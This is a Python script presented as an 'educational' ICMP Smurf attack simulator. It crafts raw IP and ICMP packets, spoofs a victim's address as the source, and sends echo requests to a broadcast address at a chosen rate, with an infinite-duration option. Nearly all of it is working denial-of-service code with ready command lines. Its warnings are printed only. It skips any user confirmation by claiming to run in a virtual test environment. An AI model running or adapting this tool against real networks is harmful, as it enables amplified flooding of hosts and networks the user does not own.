#!/usr/bin/env python3
"""
ICMP Smurf Attack Educational Simulation Tool

This tool demonstrates the ICMP Smurf attack technique for educational purposes.
It crafts custom ICMP packets using raw sockets and implements IP spoofing
to show how broadcast amplification attacks work.

Educational Use Only - Do not use for malicious purposes!
"""

import socket
import struct
import random
import time
import sys
import os
import threading
import argparse
import ipaddress
from datetime import datetime

class PacketCrafter:
    """Custom packet crafting engine for IP and ICMP protocols"""
    
    def __init__(self):
        self.packet_id = random.randint(1, 65535)
        self.sequence = 0
    
    def calculate_checksum(self, data):
        """Calculate Internet checksum (RFC 1071)"""
        # Ensure data length is even
        if len(data) % 2:
            data += b'\x00'
        
        # Sum all 16-bit words
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        # Add carry bits and wrap around
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        # One's complement
        return ~checksum & 0xFFFF
    
    def craft_ip_header(self, src_ip, dst_ip, payload_length, protocol=1, ttl=64):
        """
        Craft custom IP header with complete field control
        
        IP Header Format (RFC 791):
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |Version|  IHL  |Type of Service|          Total Length                                           |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |         Identification        |Flags|      Fragment Offset                                        |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |  Time to Live |    Protocol   |         Header Checksum                                      |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                       Source Address                                                                |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                    Destination Address                        |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        """
        
        # IP Header fields
        version = 4                                    # IPv4
        ihl = 5                                        # Internet Header Length (20 bytes)
        tos = 0                                        # Type of Service
        total_length = 20 + payload_length             # IP header + payload
        identification = self.packet_id                # Packet identification
        flags = 2                                      # Don't Fragment (DF) bit set
        fragment_offset = 0                            # Fragment offset
        header_checksum = 0                            # Will be calculated later
        
        # Convert IP addresses to binary format
        try:
            src_addr = socket.inet_aton(src_ip)
            dst_addr = socket.inet_aton(dst_ip)
        except socket.error as e:
            raise ValueError(f"Invalid IP address: {e}")
        
        # Pack IP header without checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl,     # Version + IHL
                               tos,                      # Type of Service
                               total_length,             # Total Length
                               identification,           # Identification
                               (flags << 13) + fragment_offset,  # Flags + Fragment Offset
                               ttl,                      # Time to Live
                               protocol,                 # Protocol
                               header_checksum,          # Header Checksum (0 for now)
                               src_addr,                 # Source Address
                               dst_addr)                 # Destination Address
        
        # Calculate and insert checksum
        header_checksum = self.calculate_checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl,
                               tos,
                               total_length,
                               identification,
                               (flags << 13) + fragment_offset,
                               ttl,
                               protocol,
                               header_checksum,
                               src_addr,
                               dst_addr)
        
        self.packet_id += 1  # Increment for next packet
        return ip_header
    
    def craft_icmp_header(self, icmp_type=8, icmp_code=0, identifier=None, sequence=None, payload_data=None):
        """
        Craft custom ICMP header with payload
        
        ICMP Header Format (RFC 792):
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |     Type      |     Code      |          Checksum             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |           Identifier          |        Sequence Number        |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |                             Data                              |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        """
        
        if identifier is None:
            identifier = random.randint(1, 65535)
        if sequence is None:
            sequence = self.sequence
            self.sequence += 1
        
        checksum = 0  # Will be calculated later
        
        # Create payload if not provided
        if payload_data is None:
            # Standard ping payload: timestamp + pattern
            timestamp = int(time.time() * 1000000)  # Microseconds
            attack_signature = b'ICMP_SMURF_ATTACK'
            padding = b'A' * (32 - len(attack_signature))  # Pad to 32 bytes
            payload_data = struct.pack('!Q', timestamp) + attack_signature + padding
        
        # Pack ICMP header without checksum
        icmp_header = struct.pack('!BBHHH',
                                 icmp_type,    # Type
                                 icmp_code,    # Code
                                 checksum,     # Checksum (0 for now)
                                 identifier,   # Identifier
                                 sequence)     # Sequence Number
        
        # Calculate checksum for entire ICMP packet (header + data)
        icmp_packet = icmp_header + payload_data
        checksum = self.calculate_checksum(icmp_packet)
        
        # Repack with correct checksum
        icmp_header = struct.pack('!BBHHH',
                                 icmp_type,
                                 icmp_code,
                                 checksum,
                                 identifier,
                                 sequence)
        
        return icmp_header + payload_data


class SmurfAttacker:
    """Main ICMP Smurf attack implementation with monitoring and statistics"""
    
    def __init__(self, victim_ip, broadcast_ip, interface=None, packet_rate=10, payload_size=32):
        """
        Initialize the Smurf attacker
        
        Args:
            victim_ip (str): Target victim IP address (will be spoofed as source)
            broadcast_ip (str): Broadcast address for amplification
            interface (str): Network interface to use (auto-detect if None)
            packet_rate (int): Packets per second to send
            payload_size (int): Size of ICMP payload in bytes
        """
        self.victim_ip = victim_ip
        self.broadcast_ip = broadcast_ip
        self.interface = interface
        self.packet_rate = packet_rate
        self.payload_size = payload_size
        
        # Attack statistics
        self.packets_sent = 0
        self.attack_start_time = None
        self.attack_active = False
        
        # Initialize packet crafter
        self.packet_crafter = PacketCrafter()
        
        # Validate IP addresses
        self._validate_addresses()
        
        # Create raw socket
        self._create_raw_socket()
        
        print(f"[+] Smurf Attacker initialized")
        print(f"    Victim IP: {self.victim_ip}")
        print(f"    Broadcast IP: {self.broadcast_ip}")
        print(f"    Packet Rate: {self.packet_rate} pps")
        print(f"    Payload Size: {self.payload_size} bytes")
    
    def _validate_addresses(self):
        """Validate IP addresses and network configuration"""
        try:
            # Validate victim IP
            victim_addr = ipaddress.IPv4Address(self.victim_ip)
            print(f"[+] Victim IP validated: {victim_addr}")
            
            # Validate broadcast IP
            broadcast_addr = ipaddress.IPv4Address(self.broadcast_ip)
            if not str(broadcast_addr).endswith('.255'):
                print(f"[!] Warning: {broadcast_addr} may not be a broadcast address")
            print(f"[+] Broadcast IP validated: {broadcast_addr}")
            
        except ipaddress.AddressValueError as e:
            raise ValueError(f"Invalid IP address: {e}")
    
    def _create_raw_socket(self):
        """Create and configure raw socket for packet transmission"""
        try:
            # Create raw socket for IP protocol
            self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            # Enable IP header inclusion
            self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Enable broadcast
            self.raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            
            print("[+] Raw socket created successfully")
            print("[+] Socket configured for IP header inclusion and broadcast")
            
        except PermissionError:
            print("[-] Error: Raw socket requires root/administrator privileges")
            print("    Please run with sudo: sudo python3 icmp_smurf_attack.py")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error creating raw socket: {e}")
            sys.exit(1)
    
    def craft_smurf_packet(self):
        """
        Craft a complete ICMP Smurf attack packet
        
        Returns:
            bytes: Complete IP packet with spoofed header and ICMP payload
        """
        # Create custom payload with attack signature
        timestamp = int(time.time() * 1000000)  # Microseconds
        attack_signature = b'SMURF_EDU_DEMO'
        
        # Pad to desired payload size
        remaining_size = max(0, self.payload_size - len(attack_signature) - 8)  # 8 bytes for timestamp
        padding = b'X' * remaining_size
        payload_data = struct.pack('!Q', timestamp) + attack_signature + padding
        
        # Craft ICMP packet (Type 8 = Echo Request)
        icmp_packet = self.packet_crafter.craft_icmp_header(
            icmp_type=8,
            icmp_code=0,
            payload_data=payload_data
        )
        
        # Craft IP packet with spoofed source (victim IP)
        ip_packet = self.packet_crafter.craft_ip_header(
            src_ip=self.victim_ip,      # SPOOFED: Use victim's IP as source
            dst_ip=self.broadcast_ip,   # Send to broadcast address
            payload_length=len(icmp_packet),
            protocol=1,                 # ICMP protocol
            ttl=64
        )
        
        return ip_packet + icmp_packet
    
    def send_smurf_packet(self):
        """Send a single ICMP Smurf attack packet"""
        try:
            packet = self.craft_smurf_packet()
            
            # Send packet to broadcast address
            self.raw_socket.sendto(packet, (self.broadcast_ip, 0))
            
            self.packets_sent += 1
            
            # Log packet transmission
            current_time = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"[{current_time}] Packet #{self.packets_sent}: {self.victim_ip} -> {self.broadcast_ip} (SPOOFED)")
            
            return True
            
        except Exception as e:
            print(f"[-] Error sending packet: {e}")
            return False
    
    def start_attack(self, duration=60, verbose=True):
        """
        Start the ICMP Smurf attack
        
        Args:
            duration (int): Attack duration in seconds (0 = infinite)
            verbose (bool): Enable verbose logging
        """
        self.attack_active = True
        self.attack_start_time = time.time()
        self.packets_sent = 0
        
        print(f"\n[!] STARTING ICMP SMURF ATTACK")
        print(f"[!] Duration: {duration}s" if duration > 0 else "[!] Duration: Infinite (Press Ctrl+C to stop)")
        print(f"[!] Target: {self.victim_ip}")
        print(f"[!] Amplification via: {self.broadcast_ip}")
        print(f"[!] Rate: {self.packet_rate} packets/second")
        print("-" * 60)
        
        try:
            packet_interval = 1.0 / self.packet_rate
            end_time = time.time() + duration if duration > 0 else float('inf')
            
            while self.attack_active and time.time() < end_time:
                # Send packet
                if self.send_smurf_packet():
                    # Calculate amplification potential
                    if self.packets_sent % 10 == 0:  # Every 10 packets
                        elapsed = time.time() - self.attack_start_time
                        rate = self.packets_sent / elapsed if elapsed > 0 else 0
                        print(f"[*] Attack Rate: {rate:.1f} pps | Total Sent: {self.packets_sent}")
                
                # Wait for next packet
                time.sleep(packet_interval)
                
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"[-] Attack error: {e}")
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack and display statistics"""
        self.attack_active = False
        
        if self.attack_start_time:
            duration = time.time() - self.attack_start_time
            avg_rate = self.packets_sent / duration if duration > 0 else 0
            
            print("\n" + "=" * 60)
            print("ATTACK SUMMARY")
            print("=" * 60)
            print(f"Duration: {duration:.2f} seconds")
            print(f"Packets Sent: {self.packets_sent}")
            print(f"Average Rate: {avg_rate:.2f} packets/second")
            print(f"Victim Target: {self.victim_ip}")
            print(f"Broadcast Used: {self.broadcast_ip}")
            print(f"Potential Amplification: 1 packet → N responses")
            print("=" * 60)
        
        # Close socket
        if hasattr(self, 'raw_socket'):
            self.raw_socket.close()
            print("[+] Raw socket closed")


def get_network_interfaces():
    """Get available network interfaces (simplified version)"""
    try:
        # This is a basic implementation - in real scenarios you'd use more advanced methods
        import subprocess
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if line and not line.startswith(' ') and not line.startswith('\t'):
                interface = line.split(':')[0]
                if interface not in ['lo', 'lo0']:  # Skip loopback
                    interfaces.append(interface)
        return interfaces
    except:
        return ['eth0', 'en0', 'wlan0']  # Common defaults


def calculate_broadcast_address(ip, netmask='255.255.255.0'):
    """Calculate broadcast address for a given IP and netmask"""
    try:
        network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
        return str(network.broadcast_address)
    except:
        # Fallback: assume /24 network
        parts = ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.255"


def main():
    """Main function with command-line interface"""
    parser = argparse.ArgumentParser(
        description="ICMP Smurf Attack Educational Simulation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 icmp_smurf_attack.py -v 192.168.1.10 -b 192.168.1.255
  sudo python3 icmp_smurf_attack.py -v 192.168.1.10 -b 192.168.1.255 -r 20 -d 30
  sudo python3 icmp_smurf_attack.py -v 192.168.1.10 -b 192.168.1.255 -s 64

Educational Use Only - This tool is for learning cybersecurity concepts!
        """
    )
    
    parser.add_argument('-v', '--victim', required=True, 
                       help='Victim IP address (will be spoofed as source)')
    parser.add_argument('-b', '--broadcast', required=True,
                       help='Broadcast IP address for amplification')
    parser.add_argument('-r', '--rate', type=int, default=10,
                       help='Packet transmission rate (packets/second, default: 10)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Attack duration in seconds (default: 60, 0 = infinite)')
    parser.add_argument('-s', '--size', type=int, default=32,
                       help='ICMP payload size in bytes (default: 32)')
    parser.add_argument('-i', '--interface', 
                       help='Network interface to use (auto-detect if not specified)')
    parser.add_argument('--list-interfaces', action='store_true',
                       help='List available network interfaces')
    
    args = parser.parse_args()
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[-] Error: This tool requires root privileges for raw socket access")
        print("    Please run with sudo: sudo python3 icmp_smurf_attack.py")
        sys.exit(1)
    
    # List interfaces if requested
    if args.list_interfaces:
        print("Available network interfaces:")
        for iface in get_network_interfaces():
            print(f"  - {iface}")
        sys.exit(0)
    
    # Display warning
    print("=" * 70)
    print("⚠️  ICMP SMURF ATTACK EDUCATIONAL SIMULATION TOOL")
    print("=" * 70)
    print("This tool is for educational and research purposes only!")
    print("Do not use against networks you do not own or have permission to test.")
    print("The authors are not responsible for misuse of this tool.")
    print("=" * 70)
    
    print("[!] Running in virtual test environment — skipping user input confirmation.")

    
    try:
        # Initialize attacker
        attacker = SmurfAttacker(
            victim_ip=args.victim,
            broadcast_ip=args.broadcast,
            interface=args.interface,
            packet_rate=args.rate,
            payload_size=args.size
        )
        
        # Start attack
        attacker.start_attack(duration=args.duration)
        
    except KeyboardInterrupt:
        print("\n[!] Program interrupted")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()

